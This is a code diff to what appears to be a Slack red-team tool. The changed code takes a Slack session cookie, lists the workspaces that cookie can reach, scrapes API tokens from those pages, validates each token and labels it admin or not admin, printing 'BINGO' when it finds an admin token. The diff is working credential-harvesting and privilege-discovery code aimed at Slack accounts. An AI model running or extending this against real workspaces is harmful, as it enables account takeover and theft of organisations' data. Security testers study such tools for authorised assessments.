@@ -153,12 +153,17 @@ def display_cookie_tokens(cookie):
         r = requests.get("https://slackpirate-donotuse.slack.com", cookies=cookie)
         already_signed_in_match = re.findall(ALREADY_SIGNED_IN_TEAM_REGEX, str(r.content))
         if already_signed_in_match:
+            selected_agent = getUserAgent()
             print(termcolor.colored("This cookie has access to the following Workspaces: \n", "white", "on_blue"))
             for workspace in already_signed_in_match:
                 r = requests.get(workspace, cookies=cookie)
                 regex_tokens = re.findall(SLACK_API_TOKEN_REGEX, str(r.content))
                 for slack_token in regex_tokens:
-                    print(termcolor.colored("URL: " + workspace + " Token: " + slack_token, "white", "on_green"))
+                    collected_output_info = check_token_validity(token=slack_token, user_agent=selected_agent)
+                    if check_if_admin_token(token=slack_token, output_info=collected_output_info):
+                        print(termcolor.colored("URL: " + workspace + " Token: " + slack_token + ' (admin token!)', "white", "on_green"))
+                    else:
+                        print(termcolor.colored("URL: " + workspace + " Token: " + slack_token + ' (not admin)', "white", "on_green"))
         else:
             print(termcolor.colored("No workspaces were found for this cookie", "white", "on_red"))
             exit()
@@ -182,7 +187,7 @@ def check_token_validity(token, user_agent: str) -> ScanningContext:
                                      slack_workspace=str(r['url']), user_id=str(r['user_id']), user_agent=user_agent)
             print(termcolor.colored("INFO: Token looks valid! URL: " + str(r['url']) + " User: " + str(r['user']),
                                     "white", "on_blue"))
-            print(termcolor.colored("\n"))
+            # print(termcolor.colored("\n"))
             pathlib.Path(result.output_directory).mkdir(parents=True, exist_ok=True)
         else:
             print(termcolor.colored("ERR: Token not valid. Slack error: " + str(r['error']), "white", "on_red"))
@@ -205,8 +210,9 @@ def check_if_admin_token(token, output_info: ScanningContext):
         if r['user']['is_admin'] or r['user']['is_owner'] or r['user']['is_primary_owner']:
             print(termcolor.colored("BINGO: You seem to be in possession of an admin token!", "white", "on_magenta"))
             print(termcolor.colored("\n"))
+            return True
         else:
-            return
+            return False
     except requests.exceptions.RequestException as exception:
         print(termcolor.colored(exception, "white", "on_red"))
 
